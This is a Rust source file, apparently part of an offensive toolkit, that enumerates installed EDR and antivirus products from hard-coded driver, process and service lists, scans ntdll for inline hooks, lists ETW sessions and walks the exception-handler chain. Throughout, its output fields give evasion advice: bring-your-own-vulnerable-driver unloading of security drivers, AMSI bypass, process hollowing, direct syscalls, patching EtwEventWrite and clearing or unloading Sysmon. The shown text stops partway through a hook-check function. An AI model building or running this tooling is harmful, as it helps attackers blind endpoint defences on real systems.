//! EDR Detection, Enumeration & Hook Scanning
//! Detect installed security products, scan for inline hooks, enumerate ETW sessions

use crate::error::MemoricError;
use serde_json::Value;

/// Known EDR/AV driver names and their product mappings
pub(crate) const EDR_DRIVERS: &[(&str, &str)] = &[
    // CrowdStrike
    ("csagent", "CrowdStrike Falcon"),
    ("CSBoot", "CrowdStrike Falcon"),
    ("CSDeviceControl", "CrowdStrike Falcon"),
    ("CSFirmwareAnalysis", "CrowdStrike Falcon"),
    // Microsoft Defender
    ("WdFilter", "Windows Defender"),
    ("WdNisDrv", "Windows Defender"),
    ("WdNisSvc", "Windows Defender"),
    ("MsMpEng", "Windows Defender"),
    // SentinelOne
    ("SentinelMonitor", "SentinelOne"),
    ("SentinelAgent", "SentinelOne"),
    // Carbon Black
    ("carbonblackk", "Carbon Black"),
    ("CbDefense", "Carbon Black"),
    ("Parity", "Carbon Black"),
    // Cylance
    ("CyProtectDrv", "Cylance"),
    ("CyOptics", "Cylance"),
    // Symantec / Broadcom
    ("BHDrvx64", "Symantec/Broadcom"),
    ("SYMEVENT", "Symantec/Broadcom"),
    ("SISIPSDriver", "Symantec/Broadcom"),
    // McAfee / Trellix
    ("mfehidk", "McAfee/Trellix"),
    ("mfefirek", "McAfee/Trellix"),
    ("mfencbdc", "McAfee/Trellix"),
    // Kaspersky
    ("klif", "Kaspersky"),
    ("klflt", "Kaspersky"),
    ("kneps", "Kaspersky"),
    // ESET
    ("eamonm", "ESET"),
    ("ekbdflt", "ESET"),
    ("epfwwfp", "ESET"),
    // Trend Micro
    ("tmcomm", "Trend Micro"),
    ("tmactmon", "Trend Micro"),
    ("tmevtmgr", "Trend Micro"),
    // Palo Alto
    ("CyvrFsfd", "Palo Alto Cortex"),
    ("cyverak", "Palo Alto Cortex"),
    // Bitdefender
    ("bdsandbox", "Bitdefender"),
    ("avckf", "Bitdefender"),
    ("bddevflt", "Bitdefender"),
    // Sophos
    ("SophosED", "Sophos"),
    ("SAVOnAccess", "Sophos"),
    ("savonaccess", "Sophos"),
    // Elastic
    ("ElasticEndpoint", "Elastic"),
    ("elastic-endpoint", "Elastic"),
    // Malwarebytes
    ("MBAMProtection", "Malwarebytes"),
    ("mbamchameleon", "Malwarebytes"),
    // F-Secure / WithSecure
    ("fsdfw", "F-Secure/WithSecure"),
    ("fshs", "F-Secure/WithSecure"),
    // HitmanPro / SurfRight
    ("hmpalert", "HitmanPro"),
    // Chinese AV
    ("360FsFlt", "360 Total Security"),
    ("360AntiHacker", "360 Total Security"),
    ("HuorongSysMon", "Huorong"),
    ("sysdiag", "Huorong"),
    ("QQPcTray", "Tencent PC Manager"),
    // Generic minifilters / ETW consumers
    ("PROCMON24", "Sysinternals Process Monitor"),
    ("PROCMON23", "Sysinternals Process Monitor"),
    ("Sysmon64", "Sysinternals Sysmon"),
    ("SysmonDrv", "Sysinternals Sysmon"),
];

/// Known EDR/AV process names
pub(crate) const EDR_PROCESSES: &[(&str, &str)] = &[
    ("MsMpEng.exe", "Windows Defender"),
    ("MsSense.exe", "Windows Defender ATP"),
    ("SenseIR.exe", "Windows Defender ATP"),
    ("SenseCncProxy.exe", "Windows Defender ATP"),
    ("csfalconservice.exe", "CrowdStrike"),
    ("csfalconcontainer.exe", "CrowdStrike"),
    ("SentinelAgent.exe", "SentinelOne"),
    ("SentinelServiceHost.exe", "SentinelOne"),
    ("CylanceSvc.exe", "Cylance"),
    ("CylanceUI.exe", "Cylance"),
    ("cb.exe", "Carbon Black"),
    ("RepMgr.exe", "Carbon Black"),
    ("bdagent.exe", "Bitdefender"),
    ("bdservicehost.exe", "Bitdefender"),
    ("SophosHealth.exe", "Sophos"),
    ("SSPService.exe", "Sophos"),
    ("avp.exe", "Kaspersky"),
    ("kavfs.exe", "Kaspersky"),
    ("egui.exe", "ESET"),
    ("ekrn.exe", "ESET"),
    ("mcshield.exe", "McAfee/Trellix"),
    ("mfemms.exe", "McAfee/Trellix"),
    ("PccNTMon.exe", "Trend Micro"),
    ("ntrtscan.exe", "Trend Micro"),
    ("CortexXDR.exe", "Palo Alto Cortex"),
    ("traps.exe", "Palo Alto Cortex"),
    ("elastic-agent.exe", "Elastic"),
    ("elastic-endpoint.exe", "Elastic"),
    ("mbamservice.exe", "Malwarebytes"),
    ("MBAMProtection.exe", "Malwarebytes"),
    ("AlertService.exe", "WatchGuard"),
    ("WRSA.exe", "Webroot"),
    ("360Tray.exe", "360 Total Security"),
    ("ZhuDongFangYu.exe", "360 Total Security"),
    ("HipsTray.exe", "Huorong"),
    ("wsctrl.exe", "Huorong"),
    ("Sysmon64.exe", "Sysinternals Sysmon"),
    ("Sysmon.exe", "Sysinternals Sysmon"),
    ("Procmon64.exe", "Sysinternals Process Monitor"),
];

/// Known EDR/AV services
const EDR_SERVICES: &[(&str, &str)] = &[
    ("WinDefend", "Windows Defender"),
    ("Sense", "Windows Defender ATP"),
    ("CSFalconService", "CrowdStrike"),
    ("SentinelAgent", "SentinelOne"),
    ("CarbonBlack", "Carbon Black"),
    ("CylanceSvc", "Cylance"),
    ("BDAuxSrv", "Bitdefender"),
    ("EPSecurityService", "Bitdefender"),
    ("SAVService", "Sophos"),
    ("SophosHealth", "Sophos"),
    ("AVP", "Kaspersky"),
    ("KAVFS", "Kaspersky"),
    ("ekrn", "ESET"),
    ("McShield", "McAfee/Trellix"),
    ("TmCCSF", "Trend Micro"),
    ("CynetMS", "Cynet"),
    ("elastic-agent", "Elastic"),
    ("MBAMService", "Malwarebytes"),
    ("Sysmon64", "Sysinternals Sysmon"),
];

/// Detect installed EDR/AV products via drivers, processes, and services
pub fn detect_edr_products(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use windows::Win32::System::Services::{
        EnumServicesStatusExW, OpenSCManagerW, ENUM_SERVICE_STATUS_PROCESSW, SC_ENUM_PROCESS_INFO,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_DRIVER, SERVICE_STATE_ALL, SERVICE_WIN32,
    };

    let verbose = args
        .get("verbose")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!("[EDR] Enumerating security products");

    let mut detected_products: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();

    // === 1. Check running processes ===
    unsafe {
        if let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32W::default();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snap, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim_end_matches('\0')
                        .to_string();

                    for &(proc_name, product) in EDR_PROCESSES {
                        if name.eq_ignore_ascii_case(proc_name) {
                            detected_products
                                .entry(product.to_string())
                                .or_default()
                                .push(format!("process:{} (PID {})", name, entry.th32ProcessID));
                        }
                    }

                    if Process32NextW(snap, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = windows::Win32::Foundation::CloseHandle(snap);
        }
    }

    // === 2. Check loaded drivers ===
    unsafe {
        let mut ret_len = 0u32;
        let _ = ntapi::ntexapi::NtQuerySystemInformation(11, std::ptr::null_mut(), 0, &mut ret_len);
        if ret_len > 0 {
            let mut buffer = vec![0u8; ret_len as usize];
            let status = ntapi::ntexapi::NtQuerySystemInformation(
                11,
                buffer.as_mut_ptr() as *mut _,
                ret_len,
                &mut ret_len,
            );
            if status == 0 {
                let num_modules = *(buffer.as_ptr() as *const u32);
                let entry_size = 0x128usize;
                let entries_start = 8usize;

                for i in 0..num_modules as usize {
                    let entry = buffer.as_ptr().add(entries_start + i * entry_size);
                    let name_ptr = entry.add(0x28);
                    let name_slice = std::slice::from_raw_parts(name_ptr, 256);
                    let name_end = name_slice.iter().position(|&b| b == 0).unwrap_or(256);
                    let full_path = String::from_utf8_lossy(&name_slice[..name_end]);

                    if let Some(fname) = full_path.rsplit('\\').next() {
                        let fname_lower = fname.to_lowercase();
                        for &(drv_name, product) in EDR_DRIVERS {
                            if fname_lower.contains(&drv_name.to_lowercase()) {
                                detected_products
                                    .entry(product.to_string())
                                    .or_default()
                                    .push(format!("driver:{}", full_path));
                            }
                        }
                    }
                }
            }
        }
    }

    // === 3. Check services ===
    unsafe {
        if let Ok(scm) = OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE) {
            // Check kernel drivers
            for svc_type in [SERVICE_WIN32, SERVICE_DRIVER] {
                let mut bytes_needed = 0u32;
                let mut services_returned = 0u32;
                let mut resume_handle = 0u32;

                let _ = EnumServicesStatusExW(
                    scm,
                    SC_ENUM_PROCESS_INFO,
                    svc_type,
                    SERVICE_STATE_ALL,
                    None,
                    &mut bytes_needed,
                    &mut services_returned,
                    Some(&mut resume_handle),
                    None,
                );

                if bytes_needed > 0 {
                    let mut buf = vec![0u8; bytes_needed as usize];
                    if EnumServicesStatusExW(
                        scm,
                        SC_ENUM_PROCESS_INFO,
                        svc_type,
                        SERVICE_STATE_ALL,
                        Some(&mut buf),
                        &mut bytes_needed,
                        &mut services_returned,
                        Some(&mut resume_handle),
                        None,
                    )
                    .is_ok()
                    {
                        let services = std::slice::from_raw_parts(
                            buf.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
                            services_returned as usize,
                        );

                        for svc in services {
                            let svc_name = svc.lpServiceName.to_string().unwrap_or_default();
                            for &(known_svc, product) in EDR_SERVICES {
                                if svc_name.eq_ignore_ascii_case(known_svc) {
                                    let running = svc.ServiceStatusProcess.dwCurrentState.0 == 4; // SERVICE_RUNNING
                                    detected_products
                                        .entry(product.to_string())
                                        .or_default()
                                        .push(format!(
                                            "service:{} ({})",
                                            svc_name,
                                            if running { "RUNNING" } else { "stopped" }
                                        ));
                                }
                            }
                        }
                    }
                }
            }
            windows::Win32::System::Services::CloseServiceHandle(scm).ok();
        }
    }

    // === 4. Check registry for Sysmon config ===
    unsafe {
        use windows::Win32::System::Registry::{
            RegCloseKey, RegOpenKeyExW, HKEY_LOCAL_MACHINE, KEY_READ,
        };
        let sysmon_key: Vec<u16> = "SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\0"
            .encode_utf16()
            .collect();
        let mut hkey = windows::Win32::System::Registry::HKEY::default();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            windows::core::PCWSTR(sysmon_key.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        )
        .ok()
        .is_ok()
        {
            detected_products
                .entry("Sysinternals Sysmon".to_string())
                .or_default()
                .push("registry:SysmonDrv service key present".to_string());
            let _ = RegCloseKey(hkey);
        }
    }

    // Build results
    let product_list: Vec<Value> = detected_products.iter().map(|(product, evidence)| {
        serde_json::json!({
            "product": product,
            "evidence_count": evidence.len(),
            "evidence": if verbose { serde_json::json!(evidence) } else { serde_json::json!(evidence.len()) },
        })
    }).collect();

    let risk_level = if detected_products.is_empty() {
        "LOW"
    } else if detected_products.len() <= 2 && detected_products.contains_key("Windows Defender") {
        "MEDIUM"
    } else {
        "HIGH"
    };

    Ok(serde_json::json!({
        "success": true,
        "technique": "detect_edr_products",
        "products_detected": detected_products.len(),
        "products": product_list,
        "risk_level": risk_level,
        "recommendations": get_edr_recommendations(&detected_products),
        "message": format!("Detected {} EDR/AV products", detected_products.len())
    }))
}

fn get_edr_recommendations(
    products: &std::collections::HashMap<String, Vec<String>>,
) -> Vec<String> {
    let mut recs = Vec::new();
    for product in products.keys() {
        match product.as_str() {
            "CrowdStrike Falcon" => {
                recs.push("CrowdStrike: Kernel-level hooks + ETW. Use direct syscalls, avoid CreateRemoteThread.".to_string());
                recs.push(
                    "CrowdStrike: csagent.sys hooks SSDT. Consider BYOVD to unload.".to_string(),
                );
            }
            "Windows Defender" | "Windows Defender ATP" => {
                recs.push("Defender: AMSI bypass required. ETW provides telemetry.".to_string());
                recs.push(
                    "Defender ATP: MDE has kernel sensors. Minimize suspicious thread creation."
                        .to_string(),
                );
            }
            "SentinelOne" => {
                recs.push(
                    "SentinelOne: User-mode hooks on ntdll. Unhook or use direct syscalls."
                        .to_string(),
                );
            }
            "Carbon Black" => {
                recs.push(
                    "Carbon Black: Kernel callbacks + process monitoring. Use process hollowing."
                        .to_string(),
                );
            }
            "Symantec/Broadcom" | "McAfee/Trellix" | "Kaspersky" | "ESET" => {
                recs.push(format!(
                    "{}: Traditional AV. AMSI + file-less techniques recommended.",
                    product
                ));
            }
            "Sysinternals Sysmon" => {
                recs.push(
                    "Sysmon: Extensive logging. Clear Sysmon event log or unload driver."
                        .to_string(),
                );
            }
            _ => {
                recs.push(format!(
                    "{}: Use syscall evasion and avoid common IOCs.",
                    product
                ));
            }
        }
    }
    if recs.is_empty() {
        recs.push("No EDR detected. Standard techniques should work.".to_string());
    }
    recs
}

/// Scan ntdll.dll exports for inline hooks by comparing in-memory vs disk
/// Returns list of hooked functions with hook details
pub fn scan_inline_hooks(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;

    let module_name = args
        .get("module")
        .and_then(|v| v.as_str())
        .unwrap_or("ntdll.dll");
    let max_functions = args
        .get("max_functions")
        .and_then(|v| v.as_u64())
        .unwrap_or(500) as usize;

    tracing::warn!("[EDR] Scanning {} for inline hooks", module_name);

    unsafe {
        // 1. Get in-memory module base
        let mod_w: Vec<u16> = module_name
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let mem_base = GetModuleHandleW(windows::core::PCWSTR(mod_w.as_ptr())).map_err(|e| {
            MemoricError::WindowsApi(format!("GetModuleHandle({}): {}", module_name, e))
        })?;
        let mem_ptr = mem_base.0 as *const u8;

        // 2. Map clean copy from disk
        let sys32 = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        let dll_path = format!("{}\\System32\\{}", sys32, module_name);
        let disk_bytes = std::fs::read(&dll_path)
            .map_err(|e| MemoricError::WindowsApi(format!("Read {}: {}", dll_path, e)))?;

        // 3. Parse PE headers for .text section and exports
        let dos_header = mem_ptr as *const u16;
        if *dos_header != 0x5A4D {
            return Err(MemoricError::WindowsApi("Invalid MZ header".to_string()));
        }

        let e_lfanew = *(mem_ptr.add(0x3C) as *const u32) as usize;
        let nt_headers = mem_ptr.add(e_lfanew);
        if *(nt_headers as *const u32) != 0x00004550 {
            return Err(MemoricError::WindowsApi("Invalid PE signature".to_string()));
        }

        // Optional header starts at +24
        let opt_header = nt_headers.add(24);
        let num_sections = *(nt_headers.add(6) as *const u16) as usize;

        // Export directory RVA/Size — data directory index 0
        let export_rva = *(opt_header.add(112) as *const u32) as usize;
        let export_size = *(opt_header.add(116) as *const u32) as usize;

        if export_rva == 0 {
            return Err(MemoricError::WindowsApi("No export directory".to_string()));
        }

        // Find .text section for comparison bounds
        let section_header_offset = e_lfanew + 24 + *(nt_headers.add(20) as *const u16) as usize;
        let mut text_rva = 0usize;
        let mut text_size = 0usize;

        for i in 0..num_sections {
            let sec = mem_ptr.add(section_header_offset + i * 40);
            let name = std::slice::from_raw_parts(sec, 8);
            let sec_rva = *(sec.add(12) as *const u32) as usize;
            let sec_vsize = *(sec.add(8) as *const u32) as usize;

            if name.starts_with(b".text") {
                text_rva = sec_rva;
                text_size = sec_vsize;
                break;
            }
        }

        // Parse export directory
        let export_dir = mem_ptr.add(export_rva);
        let num_functions = *(export_dir.add(20) as *const u32) as usize;
        let num_names = *(export_dir.add(24) as *const u32) as usize;
        let functions_rva = *(export_dir.add(28) as *const u32) as usize;
        let names_rva = *(export_dir.add(32) as *const u32) as usize;
        let ordinals_rva = *(export_dir.add(36) as *const u32) as usize;

        let mut hooked_functions = Vec::new();
        let mut clean_functions = 0u32;
        let mut checked = 0usize;

        let functions_ptr = mem_ptr.add(functions_rva) as *const u32;
        let names_ptr = mem_ptr.add(names_rva) as *const u32;
        let ordinals_ptr = mem_ptr.add(ordinals_rva) as *const u16;

        for i in 0..num_names.min(max_functions) {
            let name_rva = *names_ptr.add(i) as usize;
            let func_name_ptr = mem_ptr.add(name_rva);
            let func_name = std::ffi::CStr::from_ptr(func_name_ptr as *const i8)
                .to_string_lossy()
                .to_string();

            let ordinal = *ordinals_ptr.add(i) as usize;
            if ordinal >= num_functions {
                continue;
            }
            let func_rva = *functions_ptr.add(ordinal) as usize;

            // Skip forwarded exports
            if func_rva >= export_rva && func_rva < export_rva + export_size {
                continue;
            }

            // Only check functions in .text
            if text_size > 0 && (func_rva < text_rva || func_rva >= text_rva + text_size) {
                continue;
            }

            // Compare first 16 bytes: in-memory vs disk
            if func_rva + 16 > disk_bytes.len() {
                continue;
            }

            let mem_bytes = std::slice::from_raw_parts(mem_ptr.add(func_rva), 16);
            let disk_bytes_slice = &disk_bytes[func_rva..func_rva + 16];

            checked += 1;

            if mem_bytes != disk_bytes_slice {
                // Classify hook type
                let hook_type = classify_hook(mem_bytes);

                hooked_functions.push(serde_json::json!({
                    "function": func_name,
                    "rva": format!("0x{:08X}", func_rva),
                    "address": format!("0x{:016X}", mem_ptr.add(func_rva) as u64),
                    "hook_type": hook_type,
                    "memory_bytes": format_bytes(mem_bytes),
                    "disk_bytes": format_bytes(disk_bytes_slice),
                }));
            } else {
                clean_functions += 1;
            }
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "scan_inline_hooks",
            "module": module_name,
            "functions_checked": checked,
            "clean_functions": clean_functions,
            "hooked_functions": hooked_functions.len(),
            "hooks": hooked_functions,
            "hook_rate": if checked > 0 { format!("{:.1}%", hooked_functions.len() as f64 / checked as f64 * 100.0) } else { "N/A".to_string() },
            "message": format!("{} hooks detected in {} ({}/{} functions)", hooked_functions.len(), module_name, hooked_functions.len(), checked)
        }))
    }
}

fn classify_hook(bytes: &[u8]) -> &'static str {
    if bytes.len() < 5 {
        return "unknown";
    }

    // JMP rel32 (E9 xx xx xx xx)
    if bytes[0] == 0xE9 {
        return "jmp_rel32 (5-byte trampoline)";
    }

    // MOV RAX, imm64; JMP RAX (48 B8 ... FF E0)
    if bytes.len() >= 12 && bytes[0] == 0x48 && bytes[1] == 0xB8 {
        if bytes[10] == 0xFF && bytes[11] == 0xE0 {
            return "mov_rax_jmp (12-byte absolute)";
        }
    }

    // PUSH addr; RET (68 xx xx xx xx C3)
    if bytes[0] == 0x68 && bytes.len() >= 6 && bytes[5] == 0xC3 {
        return "push_ret (6-byte)";
    }

    // JMP [RIP+0] / FF 25 xx xx xx xx (6-byte indirect jump)
    if bytes[0] == 0xFF && bytes[1] == 0x25 {
        return "jmp_rip_indirect (6-byte)";
    }

    // INT 3 patches
    if bytes[0] == 0xCC {
        return "int3_breakpoint";
    }

    // NOP sled (patched with NOPs)
    if bytes.iter().take(5).all(|&b| b == 0x90) {
        return "nop_sled (patched)";
    }

    // Check for non-standard Nt* function prologue
    // Standard: 4C 8B D1 (mov r10, rcx) followed by B8 xx xx 00 00 (mov eax, ssn)
    if bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1 {
        if bytes[0] == 0xE8 {
            return "call_rel32 (detour)";
        }
        return "non_standard_prologue (likely hooked)";
    }

    "modified"
}

fn format_bytes(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Detect specific function hook status and provide unhook guidance
pub fn detect_hook_on_function(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    let module = args
        .get("module")
        .and_then(|v| v.as_str())
        .unwrap_or("ntdll.dll");
    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function name".to_string()))?;

    tracing::warn!("[EDR] Checking hook status: {}!{}", module, function);

    unsafe {
        let mod_w: Vec<u16> = module.encode_utf16().chain(std::iter::once(0)).collect();
        let mod_handle = GetModuleHandleW(windows::core::PCWSTR(mod_w.as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandle: {}", e)))?;

        let func_name = std::ffi::CString::new(function)
            .map_err(|_| MemoricError::WindowsApi("Invalid function name".to_string()))?;
        let func_addr = GetProcAddress(
            mod_handle,
            windows::core::PCSTR(func_name.as_ptr() as *const u8),
        );

        if func_addr.is_none() {
            return Err(MemoricError::WindowsApi(format!(
                "Function {} not found in {}",
                function, module
            )));
        }

        let addr = func_addr.unwrap() as *const u8;
        let mem_bytes = std::slice::from_raw_parts(addr, 32);

        // Read disk copy
        let sys32 = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        let dll_path = format!("{}\\System32\\{}", sys32, module);
        let disk_bytes = std::fs::read(&dll_path)
            .map_err(|e| MemoricError::WindowsApi(format!("Read disk: {}", e)))?;

        // Find function in disk copy by RVA
        let base_addr = mod_handle.0 as usize;
        let func_rva = addr as usize - base_addr;

        let is_hooked = if func_rva + 32 <= disk_bytes.len() {
            let disk_slice = &disk_bytes[func_rva..func_rva + 32];
            &mem_bytes[..16] != &disk_slice[..16]
        } else {
            false // Can't compare
        };

        let hook_type = if is_hooked {
            classify_hook(mem_bytes)
        } else {
            "none"
        };

        // Check for Nt* syscall pattern
        let is_syscall_fn = function.starts_with("Nt") || function.starts_with("Zw");
        let ssn = if is_syscall_fn
            && mem_bytes[0] == 0x4C
            && mem_bytes[1] == 0x8B
            && mem_bytes[2] == 0xD1
        {
            // Standard: 4C 8B D1 B8 xx xx 00 00
            if mem_bytes[3] == 0xB8 {
                Some(u16::from_le_bytes([mem_bytes[4], mem_bytes[5]]))
            } else {
                None
            }
        } else {
            None
        };

        // Hook destination analysis
        let hook_target = if is_hooked && mem_bytes[0] == 0xE9 {
            let rel32 =
                i32::from_le_bytes([mem_bytes[1], mem_bytes[2], mem_bytes[3], mem_bytes[4]]);
            let target = (addr as isize + 5 + rel32 as isize) as u64;
            Some(format!("0x{:016X}", target))
        } else if is_hooked && mem_bytes[0] == 0x48 && mem_bytes[1] == 0xB8 {
            let abs = u64::from_le_bytes([
                mem_bytes[2],
                mem_bytes[3],
                mem_bytes[4],
                mem_bytes[5],
                mem_bytes[6],
                mem_bytes[7],
                mem_bytes[8],
                mem_bytes[9],
            ]);
            Some(format!("0x{:016X}", abs))
        } else {
            None
        };

        Ok(serde_json::json!({
            "success": true,
            "technique": "detect_hook_on_function",
            "module": module,
            "function": function,
            "address": format!("0x{:016X}", addr as u64),
            "is_hooked": is_hooked,
            "hook_type": hook_type,
            "hook_target": hook_target,
            "ssn": ssn,
            "first_32_bytes": format_bytes(&mem_bytes[..32]),
            "evasion_advice": if is_hooked {
                if is_syscall_fn {
                    "Use direct syscall (resolve SSN from disk or Hell's Gate), or unhook_ntdll to restore clean copy."
                } else {
                    "Use unhook_ntdll to restore module, or find alternative API."
                }
            } else {
                "Function is clean — safe to call directly."
            },
            "message": format!("{}!{} is {}", module, function,
                if is_hooked { format!("HOOKED ({})", hook_type) } else { "CLEAN".to_string() })
        }))
    }
}

/// Enumerate active ETW tracing sessions to understand what's being monitored
pub fn enumerate_etw_sessions(args: &Value) -> Result<Value, MemoricError> {
    let _ = args;

    tracing::warn!("[EDR] Enumerating active ETW tracing sessions");

    // Use logman query to enumerate ETW sessions
    let output = std::process::Command::new("logman")
        .args(["query", "-ets"])
        .output()
        .map_err(|e| MemoricError::WindowsApi(format!("logman: {}", e)))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    // Parse sessions
    let mut sessions = Vec::new();
    let mut current_session;

    for line in stdout.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with("Data Collector") || trimmed.starts_with("-") {
            continue;
        }

        // Session lines typically have a name and status
        if !trimmed.contains("Type") && !trimmed.contains("Status") {
            if !trimmed.is_empty() {
                current_session = trimmed.to_string();
                // Determine threat level from session name
                let threat = if current_session.contains("Defender")
                    || current_session.contains("MsMp")
                {
                    "HIGH"
                } else if current_session.contains("Sysmon") || current_session.contains("SenseIR")
                {
                    "HIGH"
                } else if current_session.contains("Circular")
                    || current_session.contains("Diagtrack")
                {
                    "MEDIUM"
                } else if current_session.contains("NT Kernel")
                    || current_session.contains("EventLog")
                {
                    "LOW"
                } else {
                    "UNKNOWN"
                };

                sessions.push(serde_json::json!({
                    "name": current_session,
                    "threat_level": threat,
                }));
            }
        }
    }

    // Known dangerous providers
    let dangerous_providers = vec![
        "Microsoft-Windows-Threat-Intelligence",
        "Microsoft-Antimalware-Scan-Interface",
        "Microsoft-Windows-PowerShell",
        "Microsoft-Windows-Sysmon",
        "Microsoft-Windows-Security-Auditing",
    ];

    Ok(serde_json::json!({
        "success": true,
        "technique": "enumerate_etw_sessions",
        "sessions_found": sessions.len(),
        "sessions": sessions,
        "dangerous_providers": dangerous_providers,
        "stderr": if stderr.is_empty() { None::<String> } else { Some(stderr) },
        "recommendations": [
            "Use etw_bypass to patch EtwEventWrite for current process",
            "Consider etw_ti_remove (kernel) to disable Threat Intelligence provider",
            "Defender sessions can be blinded via BYOVD kernel callback removal"
        ],
        "message": format!("Found {} active ETW sessions", sessions.len())
    }))
}

/// Walk the Vectored Exception Handler (VEH) chain to detect monitoring
pub fn detect_veh_chain(args: &Value) -> Result<Value, MemoricError> {
    let _ = args;

    tracing::warn!("[EDR] Walking Vectored Exception Handler chain");

    unsafe {
        // VEH list is stored in ntdll internal structure
        // We access it via LdrpVectorHandlerList which is referenced from RtlAddVectoredExceptionHandler
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

        let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let ntdll = GetModuleHandleW(windows::core::PCWSTR(ntdll_w.as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandle ntdll: {}", e)))?;

        let add_veh_name = windows::core::PCSTR(b"RtlAddVectoredExceptionHandler\0".as_ptr());
        let add_veh = GetProcAddress(ntdll, add_veh_name);

        let remove_veh_name = windows::core::PCSTR(b"RtlRemoveVectoredExceptionHandler\0".as_ptr());
        let remove_veh = GetProcAddress(ntdll, remove_veh_name);

        // Register a temporary VEH to count existing handlers
        // Technique: add our handler, walk the linked list from our node
        type VehFn = unsafe extern "system" fn(
            *mut windows::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
        ) -> i32;

        unsafe extern "system" fn dummy_handler(
            _: *mut windows::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
        ) -> i32 {
            0 // EXCEPTION_CONTINUE_SEARCH
        }

        // AddVectoredExceptionHandler(0, handler)
        type AddVehFn = unsafe extern "system" fn(u32, VehFn) -> *mut std::ffi::c_void;
        type RemoveVehFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;

        if add_veh.is_none() || remove_veh.is_none() {
            return Err(MemoricError::WindowsApi(
                "VEH functions not found".to_string(),
            ));
        }

        let add_fn: AddVehFn = std::mem::transmute(add_veh.unwrap());
        let remove_fn: RemoveVehFn = std::mem::transmute(remove_veh.unwrap());

        // Add our handler at end (First=0)
        let our_handler = add_fn(0, dummy_handler);
        if our_handler.is_null() {
            return Err(MemoricError::WindowsApi(
                "AddVectoredExceptionHandler failed".to_string(),
            ));
        }

        // Walk the linked list from our node
        // VEH node structure: { LIST_ENTRY, count, handler_ptr, ... }
        // LIST_ENTRY: { Flink, Blink }
        let node = our_handler as *const usize;
        let flink = *node as *const usize;
        let blink = *(node.add(1)) as *const usize;

        let mut count = 0u32;
        let mut handlers = Vec::new();

        // Walk forward from list head
        let mut current = flink;
        let our_node_addr = node as usize;

        for _ in 0..100 {
            // Safety limit
            if current.is_null() || current as usize == our_node_addr {
                break;
            }

            // Handler pointer is at offset +16 (after LIST_ENTRY Flink+Blink + encoded handler)
            // The actual offset depends on the build, but typically:
            // Offset 0: Flink
            // Offset 8: Blink
            // Offset 16: RefCount or flags
            // Offset 24: EncodedHandler (XOR'd with cookie)
            count += 1;
            handlers.push(serde_json::json!({
                "index": count,
                "node_address": format!("0x{:016X}", current as u64),
            }));

            let next = *current as *const usize;
            if next as usize == flink as usize {
                break;
            } // Wrapped around
            current = next;
        }

        // Remove our handler
        remove_fn(our_handler);

        Ok(serde_json::json!({
            "success": true,
            "technique": "detect_veh_chain",
            "veh_handlers_found": count,
            "handlers": handlers,
            "our_handler_was": format!("0x{:016X}", our_handler as u64),
            "suspicious": count > 0,
            "message": format!("Found {} VEH handlers (excluding ours). {} may indicate EDR monitoring.",
                count, if count > 0 { "One or more" } else { "None" }),
            "recommendations": if count > 0 {
                vec!["VEH handlers detected — EDR may use these for exception-based monitoring",
                     "Consider removing handlers via LdrpVectorHandlerList manipulation",
                     "Use hardware breakpoints carefully — VEH handlers will see them"]
            } else {
                vec!["No VEH monitoring detected"]
            }
        }))
    }
}

/// Check if critical ntdll functions are hooked (quick scan of most-monitored APIs)
pub fn quick_hook_check(args: &Value) -> Result<Value, MemoricError> {
    let _ = args;

    tracing::warn!("[EDR] Quick hook check on critical APIs");

    // Most commonly hooked functions by EDR
    let critical_functions = vec![
        ("ntdll.dll", "NtWriteVirtualMemory"),
        ("ntdll.dll", "NtAllocateVirtualMemory"),
        ("ntdll.dll", "NtProtectVirtualMemory"),
        ("ntdll.dll", "NtCreateThreadEx"),
        ("ntdll.dll", "NtQueueApcThread"),
        ("ntdll.dll", "NtMapViewOfSection"),
        ("ntdll.dll", "NtCreateSection"),
        ("ntdll.dll", "NtOpenProcess"),
        ("ntdll.dll", "NtReadVirtualMemory"),
        ("ntdll.dll", "NtCreateFile"),
        ("ntdll.dll", "NtResumeThread"),
        ("ntdll.dll", "NtSetContextThread"),
